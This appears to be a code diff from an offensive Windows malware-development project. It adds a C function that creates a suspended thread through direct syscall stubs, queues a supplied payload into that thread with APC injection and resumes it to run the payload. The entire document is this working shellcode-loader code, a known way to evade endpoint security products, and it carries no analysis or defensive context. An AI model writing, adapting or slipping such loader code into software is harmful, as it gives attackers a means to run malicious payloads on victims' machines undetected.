@@ -52,3 +52,44 @@ void RandomFunction()
 	printf("[*] RandomFunction: Alertable state reached\n");
 	SleepEx(INFINITE, TRUE);
 }
+
+BOOL InitiateInjection(PVOID pPayload, SIZE_T sSize)
+{
+	HANDLE hThread = NULL;
+	HANDLE hProcess = GetCurrentProcess();
+	NTSTATUS STATUS = NULL;
+
+	if ((STATUS = Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)RandomFunction, NULL, TRUE, NULL, NULL, NULL, NULL)) != 0)
+	{
+		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
+		goto _Cleanup;
+	}
+
+	printf("[*] Suspended thread has been created with address 0x%p\n", hThread);
+
+	// Queuing the payload into APC
+	if (!ApcInjectionViaSyscalls(hProcess, hThread, pPayload, sSize))
+	{
+		printf("[!] APC Injection via Syscalls failed! \n");
+		goto _Cleanup;
+	}
+
+	printf("[*] Resuming Thread ...\n");
+
+	if ((STATUS = Sw3NtResumeThread(hThread, NULL)) != 0)
+	{
+		printf("[!] NtResumeThread Failed With Error : 0x%0.8X \n", STATUS);
+		goto _Cleanup;
+	}
+
+	if ((STATUS = Sw3NtWaitForSingleObject(hThread, TRUE, NULL)) != 0)
+	{
+		printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
+		goto _Cleanup;
+	}
+
+	return TRUE;
+
+_Cleanup:
+	return FALSE;
+}
